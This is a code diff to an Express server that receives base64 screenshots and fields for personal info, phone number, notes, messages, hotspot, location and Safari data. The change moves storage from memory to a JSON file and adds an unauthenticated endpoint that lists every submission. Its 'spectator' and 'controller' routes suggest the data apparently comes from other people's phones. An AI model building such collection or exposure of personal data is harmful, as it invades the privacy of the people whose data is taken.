@@ -4,7 +4,7 @@ const fs = require('fs');
 
 const app = express();
 
-// 15mb limit supports two base64 screenshots plus standard JSON requests
+// 15mb limit supports base64 images plus standard JSON requests
 app.use(express.json({ limit: '15mb' }));
 
 // Built-in CORS & Safari Cache-Control headers
@@ -31,18 +31,25 @@ app.get('/health', (req, res) => {
 });
 
 // ==================================================
-// 2. SCREENSHOT RECEIVER ROUTES (/api/submit & /api/latest)
+// 2. SCREENSHOT & DATA RECEIVER ROUTES
 // ==================================================
-let latestSubmission = {
-  personal_info_b64: null,
-  phone_number_b64: null,
-  notes: null,
-  messages: null,
-  hotspot: null,
-  location: null,
-  safari: null,
-  timestamp: null
-};
+const SUBMISSIONS_FILE = path.join(__dirname, 'submissions.json');
+
+function getSubmissions() {
+  if (!fs.existsSync(SUBMISSIONS_FILE)) {
+    fs.writeFileSync(SUBMISSIONS_FILE, JSON.stringify([], null, 2));
+    return [];
+  }
+  try {
+    return JSON.parse(fs.readFileSync(SUBMISSIONS_FILE, 'utf8'));
+  } catch (err) {
+    return [];
+  }
+}
+
+function saveSubmissions(subs) {
+  fs.writeFileSync(SUBMISSIONS_FILE, JSON.stringify(subs, null, 2));
+}
 
 app.post('/api/submit', (req, res) => {
   try {
@@ -65,13 +72,12 @@ app.post('/api/submit', (req, res) => {
       location === undefined ||
       safari === undefined
     ) {
-      return res.status(400).json({
-        success: false,
-        error: 'Missing required fields'
-      });
+      return res.status(400).json({ success: false, error: 'Missing required fields' });
     }
 
-    latestSubmission = {
+    const submissions = getSubmissions();
+    const newEntry = {
+      id: Date.now().toString(),
       personal_info_b64,
       phone_number_b64,
       notes,
@@ -82,27 +88,26 @@ app.post('/api/submit', (req, res) => {
       timestamp: Date.now()
     };
 
-    return res.status(200).json({ success: true, message: 'Stored!' });
+    submissions.unshift(newEntry);
+    saveSubmissions(submissions);
+
+    return res.status(200).json({ success: true, message: 'Stored!', id: newEntry.id });
   } catch (error) {
     return res.status(500).json({ success: false, error: 'Server error' });
   }
 });
 
+app.get('/api/submissions', (req, res) => {
+  const submissions = getSubmissions();
+  return res.status(200).json({ success: true, submissions });
+});
+
 app.get('/api/latest', (req, res) => {
-  if (!latestSubmission.personal_info_b64) {
+  const submissions = getSubmissions();
+  if (submissions.length === 0) {
     return res.status(404).json({ success: false, error: 'No data yet' });
   }
-  return res.status(200).json({
-    success: true,
-    personal_info_b64: latestSubmission.personal_info_b64,
-    phone_number_b64: latestSubmission.phone_number_b64,
-    notes: latestSubmission.notes,
-    messages: latestSubmission.messages,
-    hotspot: latestSubmission.hotspot,
-    location: latestSubmission.location,
-    safari: latestSubmission.safari,
-    timestamp: latestSubmission.timestamp
-  });
+  return res.status(200).json({ success: true, ...submissions[0] });
 });
 
 // ==================================================
@@ -142,17 +147,15 @@ function savePortalData(data) {
   fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
 }
 
-// Spectator Route
 app.get('/', (req, res) => {
   const indexFile = path.join(__dirname, 'index.html');
   if (fs.existsSync(indexFile)) {
     res.sendFile(indexFile);
   } else {
-    res.status(200).send('Server is live. Add index.html to your GitHub repo to view the spectator page.');
+    res.status(200).send('Server is live.');
   }
 });
 
-// Controller Web App Route
 app.get('/app', (req, res) => {
   const appFile = path.join(__dirname, 'app.html');
   if (fs.existsSync(appFile)) {
@@ -162,7 +165,6 @@ app.get('/app', (req, res) => {
   }
 });
 
-// Portal API Endpoints
 app.get('/api/portal', (req, res) => {
   res.status(200).json({ success: true, ...getPortalData() });
 });
@@ -204,64 +206,8 @@ app.all('/api/update-link', (req, res) => {
 });
 
 // ==================================================
-// 4. AI SUMMARY HISTORY RECEIVER ROUTES
+// 4. HISTORY DASHBOARD ROUTE
 // ==================================================
-const SUMMARIES_FILE = path.join(__dirname, 'summaries.json');
-
-function getSummaries() {
-  if (!fs.existsSync(SUMMARIES_FILE)) {
-    fs.writeFileSync(SUMMARIES_FILE, JSON.stringify([], null, 2));
-    return [];
-  }
-  try {
-    return JSON.parse(fs.readFileSync(SUMMARIES_FILE, 'utf8'));
-  } catch (err) {
-    return [];
-  }
-}
-
-function saveSummaries(summaries) {
-  fs.writeFileSync(SUMMARIES_FILE, JSON.stringify(summaries, null, 2));
-}
-
-// Receive new AI summary
-app.post('/api/summaries/submit', (req, res) => {
-  try {
-    const { text } = req.body;
-    if (!text || typeof text !== 'string') {
-      return res.status(400).json({ success: false, error: 'Missing or invalid text field' });
-    }
-
-    // Extract the first line as the name/title in history
-    const firstLine = text.split('\n')[0].trim();
-    const title = firstLine.length > 0 ? firstLine : 'Untitled Summary';
-    const timestamp = Date.now();
-
-    const summaries = getSummaries();
-    const newEntry = {
-      id: Date.now().toString(),
-      title,
-      text,
-      timestamp
-    };
-
-    // Add to the beginning (newest first)
-    summaries.unshift(newEntry);
-    saveSummaries(summaries);
-
-    return res.status(200).json({ success: true, entry: newEntry });
-  } catch (error) {
-    return res.status(500).json({ success: false, error: 'Server error' });
-  }
-});
-
-// Get all summaries for history
-app.get('/api/summaries', (req, res) => {
-  const summaries = getSummaries();
-  return res.status(200).json({ success: true, summaries });
-});
-
-// Serve the history dashboard page
 app.get('/history', (req, res) => {
   const historyHtmlPath = path.join(__dirname, 'history.html');
   if (fs.existsSync(historyHtmlPath)) {
